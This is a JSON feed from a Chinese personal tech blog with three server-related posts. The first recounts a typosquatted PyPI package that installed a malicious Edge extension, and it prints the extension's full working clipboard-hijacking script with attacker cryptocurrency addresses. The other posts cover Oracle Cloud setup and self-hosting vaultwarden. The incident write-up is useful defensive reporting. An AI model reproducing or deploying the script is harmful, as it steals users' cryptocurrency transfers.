{
    "version": "https://jsonfeed.org/version/1",
    "title": "Mean 个人博客 • All posts by \"服务器\" tag",
    "description": "Mean 个人博客",
    "home_page_url": "https://blog.meancoder.xyz",
    "items": [
        {
            "id": "https://blog.meancoder.xyz/2023/crypto-wallet-address-replacement-attack/",
            "url": "https://blog.meancoder.xyz/2023/crypto-wallet-address-replacement-attack/",
            "title": "记一次加密钱包地址替换攻击",
            "date_published": "2023-06-06T03:29:43.000Z",
            "content_html": "<p>说来离谱，前几天发现电脑复制的文本全都没有格式，连换行都没有了。我一度以为是\nWindows 的问题，找了各种方法，甚至覆盖安装了一次。最后才发现是 pip\n装了个错误的包，给 Edge 装了插件，会不断替换剪贴板内容。</p>\n<span id=\"more\"></span>\n<h2 id=\"起因\">起因</h2>\n<p>起因是想处理个 XML\n文件，就想装个<code>beautifulsoup4</code>，结果输成了<code>beatifulsoup4</code>。运行还是缺库，才发现命令输错了，当时就卸载了，也没多想。</p>\n<h2 id=\"排查\">排查</h2>\n<p>之后就是发现剪贴板有问题，试过各种方法都不行。然后用<kbd>Win</kbd>+<kbd>V</kbd>打开剪贴板，发现剪贴板内容一秒闪一次，开始怀疑是有程序在监听并修改剪贴板。</p>\n<p>接下来就是用排除法，一个一个地关软件，把 Edge\n关闭后，剪贴板就不闪了。我万万没想到是 Edge\n这个浓眉大眼的家伙，之后就顺理成章地怀疑是插件作怪，结果就发现了这个名为“Windows”的可疑插件。</p>\n<figure>\n<img data-src=\"https://img1.meancoder.xyz/notes/others/crypto-wallet-address-replacement-attack.png\"\nalt=\"可疑插件\" />\n<figcaption aria-hidden=\"true\">可疑插件</figcaption>\n</figure>\n<p>然后打开插件位置，发现了一个 js 脚本：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> page = chrome.<span class=\"property\">extension</span>.<span class=\"title function_\">getBackgroundPage</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> inputElement = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;input&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(inputElement);</span><br><span class=\"line\">inputElement.<span class=\"title function_\">focus</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">checkWalletAddresses</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">execCommand</span>(<span class=\"string\">&#x27;paste&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> clipboardContent = inputElement.<span class=\"property\">value</span>;</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^(0x)[A-Fa-f0-9]&#123;40&#125;$/g</span>, <span class=\"string\">&#x27;0x6eb2103839011Ed56c98145b3d3f9d6BE1b4dA63&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^T[A-Za-z1-9]&#123;33&#125;$/g</span>, <span class=\"string\">&#x27;TK3dtT7vYLkhUyzLqbQMmsrM36QzFnmfaa&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^(bnb1)[0-9a-z]&#123;38&#125;$/g</span>, <span class=\"string\">&#x27;bnb1pncs5ct0rdh3rcdms8708x9jrdy038ml33ceuw&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^([13]&#123;1&#125;[a-km-zA-HJ-NP-Z1-9]&#123;26,33&#125;|bc1[a-z0-9]&#123;39,59&#125;)$/g</span>, <span class=\"string\">&#x27;bc1qkjm7r677a4fkxcmx9kzlk55a9eaqtztq8zwrc2&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^[LM3][a-km-zA-HJ-NP-Z1-9]&#123;26,33&#125;$/g</span>, <span class=\"string\">&#x27;LcVct9KwHwUKftDNjbBxUtjK9WeUkYbRN3&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^r[0-9a-zA-Z]&#123;24,34&#125;$/g</span>, <span class=\"string\">&#x27;rJd2pxs7TxE77W8X3Ezt2QyrhMJixMehPx&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^D&#123;1&#125;[5-9A-HJ-NP-U]&#123;1&#125;[1-9A-HJ-NP-Za-km-z]&#123;32&#125;$/g</span>, <span class=\"string\">&#x27;DFbEVJUt9TcyBgVGriy3DcNBwYhK3s7Yhx&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^addr1[a-z0-9]+$/g</span>, <span class=\"string\">&#x27;addr1q8206rrze22rz8g5lggn4clv7zu9mq6w6a6llvw8v3l7r8k5l5xx9j55xyw3f7s38t37eu9ctkp5a4m4l7cuwerlux0qxlhwvz&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^[48]([0-9AB]&#123;1&#125;)([0-9a-zA-Z]&#123;93&#125;)$/g</span>, <span class=\"string\">&#x27;41iwYzbS1KKX8DFySxDcGBGGfJzywUeHxWumm4fjYxtYCiHtysXmq3P7RqG18Tv5UDKGNQegefxS2FFqrqeapvB7FuYSBJv&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^G[0-7A-Za-z]&#123;55&#125;$/g</span>, <span class=\"string\">&#x27;GCUPRZDN5RGSO3MC4LBIZBJMCS5KNUYQI2HZNUHVEBC5LNWZODWQ24XH&#x27;</span>);</span><br><span class=\"line\">\tclipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^cosmos[a-z0-9]&#123;39&#125;$/g</span>, <span class=\"string\">&#x27;cosmos1cd3hxdkc775zj75xtd3gqp8s7hynxkzewcf58y&#x27;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    inputElement.<span class=\"property\">value</span> = clipboardContent;</span><br><span class=\"line\">    inputElement.<span class=\"title function_\">select</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">execCommand</span>(<span class=\"string\">&#x27;copy&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    inputElement.<span class=\"property\">value</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setInterval</span>(checkWalletAddresses, <span class=\"number\">1000</span>);</span><br></pre></td></tr></table></figure>\n<p>这个脚本会每秒钟执行一次，把剪贴板的内容替换掉，导致了我的剪贴板格式丢失。</p>\n<h2 id=\"分析\">分析</h2>\n<p>在网上搜了一下部分代码，找到了一篇报道：<a\nhref=\"https://blog.phylum.io/phylum-discovers-revived-crypto-wallet-address-replacement-attack/\">Phylum\nDiscovers Revived Crypto Wallet Address Replacement Attack</a>。就是说\nPyPI\n中有很多和其他知名库名字相似的恶意库，会在浏览器中安装扩展，把剪贴板中的加密货币地址替换为攻击者的钱包地址。</p>\n<p>即使我第一时间就卸载了恶意库，但是在安装过程中就装了插件，卸载时并不会删除插件，所以恶意脚本就会留下来。好在我没有加密货币，不然搞不好真就要丢钱。</p>\n",
            "tags": [
                "服务器"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2023/oracle-cloud-free-server/",
            "url": "https://blog.meancoder.xyz/2023/oracle-cloud-free-server/",
            "title": "Oracle 云永久免费服务器",
            "date_published": "2023-02-08T12:15:35.000Z",
            "content_html": "<p>2021 年就了解到 <a\nhref=\"https://www.oracle.com/cn/cloud/free/\">Oracle\n云免费套餐</a>，当时还在准备考研，也申请了工行的学生信用卡，但是注册了好几次，没有通过，后来就放弃了。考完之后又不停地在试，都没有成功。一直到去年\n8 月份，突然注册成功了，就弄了一台凤凰城的 ARM 服务器，之后又弄了一台\nx86 的。简单记录一下使用时的一些问题。</p>\n<span id=\"more\"></span>\n<p>首先是网络，有免费的可更换的 IPv4 和 IPv6\n地址，还是挺舒服的。但是，Oracle 的服务器默认是不开启 IPv6\n的，需要手动开启。然后需要在安全规则里添加入站和出站规则。</p>\n<p>还有一个要注意的问题，需要在<code>iptables</code>里添加规则，否则会导致外网无法访问。具体命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo iptables -I INPUT -m state --state NEW -p tcp --dport 开放的端口号 -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p>然后在服务器上装了 <a\nhref=\"https://github.com/jeessy2/ddns-go\">ddns-go</a>，不过 IP\n不经常变，没啥必要。还装了 <a\nhref=\"https://github.com/DIYgod/RSSHub\">RSSHub</a> 和<a\nhref=\"https://github.com/whyour/qinglong\">青龙</a>，这俩也都没用，主要的服务都部署在国内的腾讯云上。</p>\n<p>另外，用 DNSPod 解析 IPv4 可能导致 IP 被封，所以 IPv4\n就没解析了。</p>\n",
            "tags": [
                "服务器"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2022/bitwarden-server/",
            "url": "https://blog.meancoder.xyz/2022/bitwarden-server/",
            "title": "自建 Bitwarden 服务器",
            "date_published": "2022-06-03T08:41:52.000Z",
            "content_html": "<p>好久没更新博客了，现在毕设答辩也结束了，终于有时间更新一下了。今天先写写\nBitwarden 服务器吧。</p>\n<span id=\"more\"></span>\n<p><a\nhref=\"https://bitwarden.com/\">Bitwarden</a>就不多介绍了，很有名的开源密码管理器。Bitwarden\n官方是有免费版的，也基本够用，但是既然有台服务器，又有些担心安全问题，就自己搭建了一个。</p>\n<p>Bitwarden 官方也提供部署脚本和 Dokcer\n镜像，但是占的资源比较多，所以选择了使用比较多的第三方的<a\nhref=\"https://github.com/dani-garcia/vaultwarden\">vaultwarden</a>（原名\nbitwarden_rs），非常轻量。</p>\n<p>我是用 Doceker Compose，没什么难度，简单分享下 compose 文件。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&quot;3&quot;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">vaultwarden:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">vaultwarden/server:latest</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">vaultwarden</span></span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">LOG_FILE=/data/bitwarden.log</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">WEBSOCKET_ENABLED=true</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">TZ=Asia/Shanghai</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">LC_ALL=zh_CN.UTF-8</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/var/bitwarden/data/:/data/</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">8880</span><span class=\"string\">:80</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">3012</span><span class=\"string\">:3012</span></span><br></pre></td></tr></table></figure>\n<p>然后用 Nginx 做了个反代，加了 SSL。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream vaultwarden-default &#123; server 127.0.0.1:8880; &#125;</span><br><span class=\"line\">upstream vaultwarden-ws &#123; server 127.0.0.1:3012; &#125;</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       80;</span><br><span class=\"line\">    listen [::]:80;</span><br><span class=\"line\">    server_name  bitwarden.meancoder.xyz;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_log  /var/log/nginx/error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    return       301 https://$host$request_uri;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 443 ssl http2;</span><br><span class=\"line\">    listen [::]:443 ssl http2;</span><br><span class=\"line\">    server_name  bitwarden.meancoder.xyz;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_log  /var/log/nginx/error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_certificate /home/ubuntu/.keys/bitwarden.meancoder.xyz/Nginx/1_bitwarden.meancoder.xyz_bundle.crt;</span><br><span class=\"line\">    ssl_certificate_key /home/ubuntu/.keys/bitwarden.meancoder.xyz/Nginx/2_bitwarden.meancoder.xyz.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-default;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location /notifications/hub &#123;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-ws;</span><br><span class=\"line\">        proxy_set_header Upgrade $http_upgrade;</span><br><span class=\"line\">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location /notifications/hub/negotiate &#123;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-default;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location /admin &#123;</span><br><span class=\"line\">        auth_basic &quot;Administrator’s Area&quot;;</span><br><span class=\"line\">        auth_basic_user_file /etc/apache2/.htpasswd;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-default;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>中间还遇到了一个小问题，刚搭建完的时候，想随便建个账号测试下，可是注册的时候一直报错，改了半天配置都不行。最后换了个复杂的密码就好了。</p>\n",
            "tags": [
                "服务器"
            ]
        }
    ]
}